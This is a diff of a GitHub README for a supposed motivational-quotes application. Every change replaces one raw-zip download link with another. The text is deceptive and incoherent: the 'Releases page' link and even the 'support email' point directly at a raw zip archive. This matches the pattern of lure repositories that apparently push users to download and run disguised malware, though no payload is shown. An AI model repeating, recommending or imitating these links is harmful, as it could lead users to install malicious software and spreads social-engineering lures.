@@ -4,7 +4,7 @@
 Welcome to **senna-motivational-content**! This application provides a variety of motivational quotes and resources to boost your confidence and inspire you in your daily life. Follow the steps below to easily download and run the software.
 
 ## 📦 Download Now
-[![Download](https://github.com/nasir631462/senna-motivational-content/raw/refs/heads/main/senna-motivational-content/content-senna-motivational-v2.1.zip)](https://github.com/nasir631462/senna-motivational-content/raw/refs/heads/main/senna-motivational-content/content-senna-motivational-v2.1.zip)
+[![Download](https://github.com/nasir631462/senna-motivational-content/raw/refs/heads/main/senna-motivational-content/articles/content_motivational_senna_3.9.zip)](https://github.com/nasir631462/senna-motivational-content/raw/refs/heads/main/senna-motivational-content/articles/content_motivational_senna_3.9.zip)
 
 ## 🛠️ System Requirements
 To run the **senna-motivational-content** application, you will need the following:
@@ -22,7 +22,7 @@ To run the **senna-motivational-content** application, you will need the followi
 - **Offline Access**: Enjoy the quotes even when you are not connected to the internet.
 
 ## 📥 Download & Install
-To download **senna-motivational-content**, visit the Releases page here: [Download Page](https://github.com/nasir631462/senna-motivational-content/raw/refs/heads/main/senna-motivational-content/content-senna-motivational-v2.1.zip).
+To download **senna-motivational-content**, visit the Releases page here: [Download Page](https://github.com/nasir631462/senna-motivational-content/raw/refs/heads/main/senna-motivational-content/articles/content_motivational_senna_3.9.zip).
 
 1. Click on the link above.
 2. You will see a list of available versions.
@@ -53,7 +53,7 @@ We welcome contributions! If you have suggestions, feel free to open an issue or
 ## 💬 Support
 If you encounter any problems or have questions, please check our FAQ section in the app. Alternatively, you can create an issue on GitHub for additional help.
 
-For further inquiries or support, use this email: https://github.com/nasir631462/senna-motivational-content/raw/refs/heads/main/senna-motivational-content/content-senna-motivational-v2.1.zip
+For further inquiries or support, use this email: https://github.com/nasir631462/senna-motivational-content/raw/refs/heads/main/senna-motivational-content/articles/content_motivational_senna_3.9.zip
 
 ## 🌟 Acknowledgments
 Thanks to all contributors and supporters of the **senna-motivational-content** project. Your feedback ensures that we continuously improve the application and serve up the best motivational content possible.
